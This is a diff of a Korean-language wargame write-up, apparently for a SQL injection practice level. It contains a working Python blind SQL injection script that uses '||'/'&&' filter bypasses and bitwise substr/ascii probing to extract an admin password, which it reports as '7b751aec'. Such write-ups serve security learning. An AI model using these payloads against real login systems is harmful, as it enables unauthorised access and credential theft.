@@ -65,7 +65,7 @@ or와 and가 필터링되어 있기 때문에 각각 ||, &&을 사용한다.
 password_length = 0
 
 while True:
-	password_length += 1
+    password_length += 1
     query = f"{url}/?pw=' || id='admin' %26%26 length(pw)={password_length}-- -"
     response=get(query, headers=header)
     if "<h2>" in response.text:
@@ -148,41 +148,47 @@ header = {'cookie' : 'PHPSESSID=자신의 쿠키값'}
 password_length = 0
 
 while True:
-	password_length += 1
+    password_length += 1
     query = f"{url}/?pw=' || id='admin' %26%26 length(pw)={password_length}-- -"
-    response=get(query, headers=header)
+    response = get(query, headers=header)
     if "<h2>" in response.text:
-    	break
-print(f"password_lengh : {password_length}")
+        break
+print(f"password_length: {password_length}")
 
 password = ""
 
 for i in range(1, password_length + 1):
-	bit_length = 0
-	while True:
-    	bit_length += 1
+    bit_length = 0
+    while True:
+        bit_length += 1
         query = f"{url}/?pw=' || id='admin' %26%26 length(bin(ascii(substr(pw, {i}, 1))))={bit_length}-- -"
-        response=get(query, headers=header)
-    	if "<h2>" in response.text:
-    		break
-    print(f"bit_number : {i}, length : {bit_length}")
+        response = get(query, headers=header)
+        if "<h2>" in response.text:
+            break
+    print(f"bit_number: {i}, length: {bit_length}")
     
     bits = ""
-	for j in range(1, bit_length + 1):
-		query = f"{url}/?pw=' || id='admin' %26%26 substr(bin(ascii(substr(pw, {i}, 1))), {j}, 1)= '1'-- -"
-    	response=get(query, headers=header)
-    	if "<h2>" in response.text:
-    		bits += "1"
-    	else:
-    		bits += "0"
-	print(f"bit_number : {i}, bit : {bits}")
+    for j in range(1, bit_length + 1):
+        query = f"{url}/?pw=' || id='admin' %26%26 substr(bin(ascii(substr(pw, {i}, 1))), {j}, 1)='1'-- -"
+        response = get(query, headers=header)
+        if "<h2>" in response.text:
+            bits += "1"
+        else:
+            bits += "0"
+    print(f"bit_number: {i}, bit: {bits}")
     
     password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")
 
 print(password)
+
 ```
 
 코드를 실행하면 admin의 pw인 '7b751aec'를 얻을 수 있다.
 
+![image](https://github.com/user-attachments/assets/d89fee37-071b-4719-b80b-47bd86eea313)
 
+찾아낸 pw를 입력하면
 
+![image](https://github.com/user-attachments/assets/c0ffaba4-646d-4b42-ade9-b3cdb12385c0)
+
+Clear 했다!!
